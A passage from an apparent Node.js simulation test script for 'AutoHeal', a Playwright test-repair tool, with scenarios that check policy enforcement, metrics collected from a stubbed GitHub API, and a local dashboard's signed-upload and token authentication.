      const r = evil(name, patch);
      check(!r.ok && !r.pushed && /publish refused/.test(r.out), `tampered patch refused: ${name}`);
    }
  },

  policy() {
    const policyText = ['# Team rules for AutoHeal', 'protect:', '  - pages/', 'skip:', '  titles: [status badge]', 'limits:', '  max-failures: 3', 'fixes:', '  allow: [rules, ai]', ''].join('\n');
    const dir = prepare('policy', (d) => writeFileSync(path.join(d, '.autoheal.yml'), policyText));
    const script = fixScript(file(dir, 'tests/login.spec.ts'), file(dir, 'pages/profile.ts'));
    writeFileSync(path.join(dir, 'script.json'), JSON.stringify(script));
    const po = file(dir, 'pages/profile.ts');
    const { code, summary } = heal(dir, ['--mode', 'draft-pr', '--no-flaky-check'], { AUTOHEAL_PROVIDER: 'scripted', AUTOHEAL_SCRIPT: path.join(dir, 'script.json'), AUTOHEAL_PRICE_IN: '4', AUTOHEAL_PRICE_OUT: '20' });
    check(code === 0, `exit code 0 (got ${code})`);
    const badge = byTest(summary, 'status badge');
    check(badge?.skipped === true && badge.status === 'UNFIXED', 'flaky test left alone by skip.titles (not quarantined)');
    check(!existsSync(path.join(dir, 'playwright-quarantine.json')), 'no quarantine file');
    check(byTest(summary, 'user can log in')?.status === 'FIXED', 'login test still fixed by the AI');
    const profile = byTest(summary, 'profile greets');
    check(profile?.status !== 'FIXED', `the page-object fix was refused (status ${profile?.status})`);
    check(file(dir, 'pages/profile.ts') === po, 'protected page object unchanged');
    check(summary?.policy?.includes('1 protected path') && summary.policy.includes('fixes allowed: rules, ai'), `policy noted in the summary (${summary?.policy})`);
    const body = existsSync(path.join(dir, '.autoheal-out', 'pr-body.md')) ? file(dir, '.autoheal-out/pr-body.md') : '';
    check(/Policy \(\.autoheal\.yml\)/.test(body), 'PR body says a policy applied');
    writeFileSync(path.join(dir, '.autoheal.yml'), 'fixes:\n  alow: [ai]\n');
    const broken = heal(dir, ['--mode', 'draft-pr']);
    check(broken.code !== 0 && /unknown setting "alow"/.test(broken.stderr ?? ''), `a broken policy stops the job (exit ${broken.code})`);
  },

  metrics() {
    const dir = path.join(workRoot, 'metrics');
    rmSync(dir, { recursive: true, force: true });
    mkdirSync(dir, { recursive: true });
    const soon = new Date(Date.now() + 3 * 86_400_000).toISOString().slice(0, 10);
    writeFileSync(path.join(dir, 'playwright-quarantine.json'), JSON.stringify({ version: 1, entries: [{ file: 'tests/a.spec.ts', title: 'flaky one', until: '2020-01-01' }, { file: 'tests/b.spec.ts', title: 'flaky two', until: soon }] }));
    const created = new Date(Date.now() - 2 * 86_400_000).toISOString();
    const merged = new Date(Date.now() - 86_400_000).toISOString();
    const marker = (by) => `<!-- autoheal-fixes:${Buffer.from(JSON.stringify([{ file: 'tests/login.spec.ts', test: 'login', by }])).toString('base64')} -->`;
    const run = `<!-- autoheal-run:${Buffer.from(JSON.stringify({ usd: 0.12, tokens: 3000, minutes: 45, failures: 1, fixed: 1, quarantined: 0 })).toString('base64')} -->`;
    const own = { repo: { full_name: 'acme/shop' } };
    const routes = {
      '/repos/acme/shop/pulls': [
        { number: 8, state: 'closed', created_at: created, merged_at: merged, body: `${marker('fingerprint')}\n${run}`, head: { ref: 'autoheal/8', ...own }, base: own },
        { number: 9, state: 'closed', created_at: created, merged_at: null, body: marker('ai'), head: { ref: 'autoheal/9', ...own }, base: own },
      ],
      '/repos/acme/shop/pulls/8/commits': [{ commit: { message: 'test: AutoHeal fixes for failed run 8' } }],
      '/repos/acme/shop/issues': [{ title: 'AutoHeal: possible app regression in "price"', state: 'open', created_at: created }],
    };
    const portFile = path.join(dir, 'stub-port');
    const stub = spawn(
      process.execPath,
      ['-e', "const routes = JSON.parse(process.env.STUB_ROUTES); const s = require('http').createServer((q, r) => { const body = routes[new URL(q.url, 'http://x').pathname]; r.statusCode = body ? 200 : 404; r.setHeader('content-type', 'application/json'); r.end(JSON.stringify(body ?? {})); }).listen(0, '127.0.0.1', () => require('fs').writeFileSync(process.env.STUB_PORT_FILE, String(s.address().port)))"],
      { stdio: 'ignore', env: { ...process.env, STUB_ROUTES: JSON.stringify(routes), STUB_PORT_FILE: portFile } },
    );
    for (let i = 0; i < 50 && !existsSync(portFile); i++) Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 100);
    try {
      const port = readFileSync(portFile, 'utf8').trim();
      const summaryFile = path.join(dir, 'step-summary.md');
      const res = spawnSync(process.execPath, [cli, 'metrics', '--repo', 'acme/shop', '--days', '30', '--json', 'm.json'], {
        cwd: dir,
        encoding: 'utf8',
        env: { ...process.env, GITHUB_TOKEN: 'fake', GITHUB_API_URL: `http://127.0.0.1:${port}`, GITHUB_STEP_SUMMARY: summaryFile },
      });
      check(res.status === 0, `exit code 0 (got ${res.status}${res.status ? `: ${res.stderr}` : ''})`);
      const m = existsSync(path.join(dir, 'm.json')) ? JSON.parse(file(dir, 'm.json')) : null;
      check(m?.prs.opened === 2 && m.prs.merged === 1 && m.prs.closed === 1, `2 fix PRs: 1 merged, 1 closed (${JSON.stringify(m?.prs)})`);
      check(m?.acceptance === 0.5 && m.noAiShare === 0.5, 'acceptance 50%, half the fixes without AI');
      check(m?.spend.usd === 0.12 && m.minutesSaved === 45, 'spend and time saved read from the run marker');
      check(m?.issues.opened === 1, 'one app-bug issue');
      check(m?.quarantine?.expired.length === 1 && m.quarantine.expiringSoon.length === 1, 'one expired and one expiring quarantine entry');
      check(/AutoHeal metrics: acme\/shop/.test(res.stdout) && /Expired quarantine entries/.test(res.stdout), 'Markdown report printed');
      check(existsSync(summaryFile) && /Acceptance rate \| 50% \|/.test(file(dir, 'step-summary.md')), 'report written to the job summary');
    } finally {
      stub.kill();
    }
  },

  async dashboard(aiResult) {
    const result = aiResult ?? scenarios.ai();
    const { spawn } = await import('node:child_process');
    const dbDir = path.join(workRoot, 'dashboard');
    rmSync(dbDir, { recursive: true, force: true });
    mkdirSync(dbDir, { recursive: true });
    const secret = 'sim-secret-0123456789-abcdefghijklmnop';
    const port = 4399;
    const server = spawn(process.execPath, [cli, 'dashboard', '--port', String(port), '--host', '127.0.0.1', '--db', path.join(dbDir, 'a.db')], {
      env: { ...process.env, AUTOHEAL_DASHBOARD_SECRET: secret, AUTOHEAL_DASHBOARD_VIEW_TOKEN: 'view-token-1234567890' },
      stdio: 'pipe',
    });
    try {
      for (let i = 0; i < 50; i++) {
        try {
          if ((await fetch(`http://127.0.0.1:${port}/healthz`)).ok) break;
        } catch {}
        await new Promise((r) => setTimeout(r, 100));
      }
      const up = spawnSync(process.execPath, [cli, 'upload', '--summary', path.join(result.dir, '.autoheal-out', 'summary.json'), '--pr-url', 'https://github.com/acme/shop/pull/7'], {
        encoding: 'utf8',
        env: { ...process.env, AUTOHEAL_DASHBOARD_URL: `http://127.0.0.1:${port}`, AUTOHEAL_DASHBOARD_SECRET: secret },
      });
      check(up.status === 0 && /HTTP 200/.test(up.stderr), `signed upload accepted (${up.stderr.trim()})`);
      const bad = await fetch(`http://127.0.0.1:${port}/api/heal`, { method: 'POST', body: '{"version":1,"events":[]}', headers: { 'x-autoheal-signature': 'sha256=00', 'x-autoheal-timestamp': String(Math.floor(Date.now() / 1000)) } });
      check(bad.status === 401, `unsigned upload rejected (HTTP ${bad.status})`);
      const noView = await fetch(`http://127.0.0.1:${port}/api/stats`);
      check(noView.status === 401, 'stats need the view token');
      const stats = await (await fetch(`http://127.0.0.1:${port}/api/stats`, { headers: { authorization: 'Bearer view-token-1234567890' } })).json();
      check(stats.stats.fixed === 2 && stats.stats.fixPrs === 1 && stats.stats.appBugs === 1 && stats.stats.quarantined === 1, `stats: ${JSON.stringify(stats.stats)}`);
      const page = await (await fetch(`http://127.0.0.1:${port}/`, { headers: { authorization: 'Bearer view-token-1234567890' } })).text();
      check(page.includes('AutoHeal Dashboard') && page.includes('LOCATOR_DRIFT') && page.includes('pull/7'), 'dashboard page lists the results');
    } finally {
      server.kill();
    }
  },
};

const wanted = process.argv.slice(2);
const order = wanted.length ? wanted : ['rules', 'ai', 'cheat', 'comment', 'fingerprint', 'reviews', 'policy', 'metrics', 'action', 'dashboard'];
let aiResult;
for (const name of order) {
  if (!scenarios[name]) {
    console.error(`Unknown scenario ${name}`);
    process.exit(2);
  }
  console.log(`\n▶ ${name}`);
  const started = Date.now();
  const out = name === 'dashboard' ? await scenarios.dashboard(aiResult) : scenarios[name]();
  if (name === 'ai') aiResult = out;
  console.log(`  (${((Date.now() - started) / 1000).toFixed(0)}s)`);
}
console.log(failures ? `\n${failures} check(s) failed` : '\nAll simulation checks passed');
process.exit(failures ? 1 : 0);
